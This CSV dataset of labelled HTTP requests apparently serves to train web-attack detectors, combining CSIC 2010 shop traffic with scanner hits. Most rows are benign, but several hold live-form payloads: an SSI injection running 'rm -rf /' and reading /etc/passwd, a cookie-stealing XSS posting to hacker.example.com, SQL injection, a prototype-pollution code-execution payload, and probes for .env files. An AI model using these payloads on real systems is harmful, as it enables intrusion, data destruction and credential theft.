text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
GET /tienda1/miembros/imagenes/ogono.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=8CD5FD0E2B7067D3CC6CFD83242091A8 localhost:8080  ,GET,/tienda1/miembros/imagenes/ogono.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /ruby_app/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/ruby_app/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/imagenes/2.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=48DE8E9DF0D7793C0E0EE53B4B7853C8 localhost:8080  ,GET,/tienda1/imagenes/2.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=FCB84E55A2A65A3554D41E918D698D5F localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modoA=insertar&precio=8305&B1=Confirmar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=A36448F016EFC85E90DEF792E149AA7E localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modoA=insertar&precio=8305&B1=Confirmar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=weatherl4&pwd=65ce%2Cr%27a&remember=on&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=110A2D5FA409EA42F41E99336A951019 localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=weatherl4&pwd=65ce%2Cr%27a&remember=on&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3010C9EFE311DF2E2484C60C297611E0 localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=%27OR%27a%3D%27a&login=onfre&password=%24huaico&nombre=Stella&apellidos=Botella&email=pescard_praeger%40hipereuskadi.ms&dni=34934492E&direccion=Aguamarina+92%2C+6F&ciudad=Albal%E1&cp=42351&provincia=Le%F3n&ntc=0340155501114760&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=F1E77706EBB8F5E43B22060A17831155 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=%27OR%27a%3D%27a&login=onfre&password=%24huaico&nombre=Stella&apellidos=Botella&email=pescard_praeger%40hipereuskadi.ms&dni=34934492E&direccion=Aguamarina+92%2C+6F&ciudad=Albal%E1&cp=42351&provincia=Le%F3n&ntc=0340155501114760&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/imagenes/zarauz.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=ED1092EA1EA43C2B4F18DC76388223FD localhost:8080  ,GET,/tienda1/miembros/imagenes/zarauz.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=8912&B1=Pasar+por+caja  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=22529DA5864B8FF489CDFA75081E516D localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=8912&B1=Pasar+por+caja,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=2  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=16F0BF8A74253CE234E69997053AD3B2 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=2,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=hannula&password=f0anh5eso&nombre=Josela&apellidos=Urzagaste+Galdon&email=cantinflas%40atrioregalos.bz&dni=06064345G&direccionA=C%2F+Batalla+De+Aina+190+6%3FA&ciudad=Sant+Fost+de+Campsentelles&cp=24359&provincia=Salamanca&ntc=6513561251939678&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=2C4383DF8A5D0B018D1326736B645D2C localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=hannula&password=f0anh5eso&nombre=Josela&apellidos=Urzagaste+Galdon&email=cantinflas%40atrioregalos.bz&dni=06064345G&direccionA=C%2F+Batalla+De+Aina+190+6%3FA&ciudad=Sant+Fost+de+Campsentelles&cp=24359&provincia=Salamanca&ntc=6513561251939678&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/creditos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7EED00FB98F789F1F01F2FB55F893AE5 localhost:8080  ,GET,/tienda1/global/creditos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsg=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=1CC11E35798EC889DAADE443A4EE2D1C localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsg=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=1&nombre=Vino+Rioja&precio=39&cantidad=43&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=CCBBC21C40FE643B85C6F8AE76EE98AB localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=39&cantidad=43&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=dehoff&pwd=2O0erI23&remember=off&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=5369BB1DF47DF596CB40DAF89B5647F7 localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=dehoff&pwd=2O0erI23&remember=off&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/imagenes/castro.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=90ED35DF27D5DA8BADCAFCB31B9CA831 localhost:8080  ,GET,/tienda1/miembros/imagenes/castro.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=943&B1=Confirmar%7C [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=DB4A60499BB2A90BF700624F6728C49C localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=943&B1=Confirmar%7C,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=methi&password=b9s37ac1&nombre=Quill%E9n&apellidos=Morande&email=monelli%40carimartin.gd&dni=87356578W&direccion=Andia%2C+113+11G&ciudad=Pueblica+de+Valverde&cp=50420&provincia=Zamora&ntc=5509893161352437&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=E47A23393913BD49AD0E40527CFA00D2 localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=methi&password=b9s37ac1&nombre=Quill%E9n&apellidos=Morande&email=monelli%40carimartin.gd&dni=87356578W&direccion=Andia%2C+113+11G&ciudad=Pueblica+de+Valverde&cp=50420&provincia=Zamora&ntc=5509893161352437&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsgA=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=B2FCD9C38947EC83E9BA7CB9A2CE4958 localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsgA=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/1.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=04E279C59347DDD37BDDF57357B4C2C0 localhost:8080  ,GET,/tienda1/imagenes/1.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=72&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=28A96D8DB4C40D67373CDB3F026B0B75 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=72&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /sources/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/sources/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=kuntova&pwd=TROvA&remember=on%2B&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=FC2D56101F5876E667FCD95AA8A721AC localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=kuntova&pwd=TROvA&remember=on%2B&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=2639&B1=Pasar+por+caja  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D3958EDB44B35BC328C0EDCA5A780065 localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=2639&B1=Pasar+por+caja,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  id=1%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=85A887B128454F72E2B08F60E8A5F652 localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,id=1%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
GET /tienda1/global/creditos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=F131DA02CB53A9CB43D531AF8A808086 localhost:8080  ,GET,/tienda1/global/creditos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=8E722897D416B6D0B6E97636C09ECC42 localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=boothe&password=inusitado&nombre=Odelia&apellidos=De+la+Barca+Pitti&email=dierking3%40carmensanmartin.kn&dni=69557398Q&direccion=Diaz+Camacho+107%2C+2-A&ciudad=Sant+Esteve+de+la+Sarga&cp=40184&provincia=Segovia&ntc=9636562879352994&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=59482769F5FFB30BE9239646F8BBCEB9 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=boothe&password=inusitado&nombre=Odelia&apellidos=De+la+Barca+Pitti&email=dierking3%40carmensanmartin.kn&dni=69557398Q&direccion=Diaz+Camacho+107%2C+2-A&ciudad=Sant+Esteve+de+la+Sarga&cp=40184&provincia=Segovia&ntc=9636562879352994&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  idA=2 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=DB5EAF5386C345F066DDEA8467C8844B localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,idA=2,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsg=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=EB8F87334138CDD627CA499386154A40 localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsg=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /kubernetes/configmap.yml.bak [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/kubernetes/configmap.yml.bak,,,curl/8.7.1,404,1,scanning,loki_exp1
"GET /favicon.ico [SEP]   [SEP] Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 [SEP]     ",GET,/favicon.ico,,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",404,1,scanning,loki_exp1
GET /tienda1/miembros/fotos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6B1DB800A217B73E27F85702A43A92A0 localhost:8080  ,GET,/tienda1/miembros/fotos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsgA=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=C1F20D9D26AFA0A30F55305FD610519E localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsgA=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=ayse&pwd=quillotrar&remember=off%2F&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=19B9278E073841A73B9EE186DD22AC70 localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=ayse&pwd=quillotrar&remember=off%2F&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /web/settings.json [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/web/settings.json,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/vaciar.jsp [SEP]  B2=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=08004480DA3F4AB405EC280BE3A095CB localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /api.cgi [SEP] cmd=GetAiCfg  [SEP] Umai-Scanner/2.0 (+https://umai.entelijan.com/methodology) [SEP]     ,GET,/api.cgi,cmd=GetAiCfg,,Umai-Scanner/2.0 (+https://umai.entelijan.com/methodology),404,1,scanning,loki_exp1
POST /tienda1/publico/vaciar.jsp [SEP]  B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=1C44EA11D0FB66A61E10FB10C4A044E9 localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,xss,csic2010
GET /tienda1/miembros/imagenes/castro.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=482425AEC019801F3C420CCE8087D5E0 localhost:8080  ,GET,/tienda1/miembros/imagenes/castro.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
"POST /api/route [SEP]  ------WebKitFormBoundaryx469737740121
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 77020+true+6098906;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx469737740121
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx469737740121
------WebKitFormBoundaryx469737740121-- [SEP] Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [SEP]     ",POST,/api/route,,"------WebKitFormBoundaryx469737740121
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 77020+true+6098906;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx469737740121
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx469737740121
------WebKitFormBoundaryx469737740121--","Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36",404,1,sqli,loki_exp1
GET /tienda1/imagenes/2.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=86AEF18848DF09607657BADA9AFFE0BA localhost:8080  ,GET,/tienda1/imagenes/2.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/2.gif/6909030637832563290.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E4932D5356DEC11CFCBB974705148DB4 localhost:8080  ,GET,/tienda1/imagenes/2.gif/6909030637832563290.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/vaciar.jsp [SEP] B2A=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=AC1A4CCCAC353FC464B610A2CB6C8665 localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
"POST /jsonrpc [SEP]  {""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}} [SEP] Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) [SEP]     ",POST,/jsonrpc,,"{""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}}",Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),404,1,scanning,loki_exp1
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=dana&password=ibe2io&nombre=Tiago&apellidos=Burunat+Jaraba&email=klyaro%40hostrofessional.com.kg&dni=26315307H&direccion=Plza.+Del+Ingenier%2Bo+Orueta%2B%2C*+77%2C+7B&ciudad=Plasenzuela&cp=40194&provincia=Albacete&ntc=2227850098385549&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=53C6FC8D29B446B32FCACD3DFCDEA6DD localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=dana&password=ibe2io&nombre=Tiago&apellidos=Burunat+Jaraba&email=klyaro%40hostrofessional.com.kg&dni=26315307H&direccion=Plza.+Del+Ingenier%2Bo+Orueta%2B%2C*+77%2C+7B&ciudad=Plasenzuela&cp=40194&provincia=Albacete&ntc=2227850098385549&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=pearce&pwd=coRDiTa&remember=on&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5CDA240E2B72D76CBAC0003155FF641B localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=pearce&pwd=coRDiTa&remember=on&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/4861362529278789730 [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6D57835E95199CD447DD6E6F18A9E3E4 localhost:8080  ,GET,/tienda1/miembros/4861362529278789730,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=crosswel&password=f3ac76025&nombre=Enrico&apellidos=Jord%E1&email=burstein%40g-audio.ee&dni=92621448B&direccion=Calle+Tremp%2C+196+11%3FG&ciudad=San+Ildefonso&cp=01478&provincia=Barcelona&ntc=7895531711840476&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=62503E9B979517261D29E1FBDF4DB012 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=crosswel&password=f3ac76025&nombre=Enrico&apellidos=Jord%E1&email=burstein%40g-audio.ee&dni=92621448B&direccion=Calle+Tremp%2C+196+11%3FG&ciudad=San+Ildefonso&cp=01478&provincia=Barcelona&ntc=7895531711840476&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
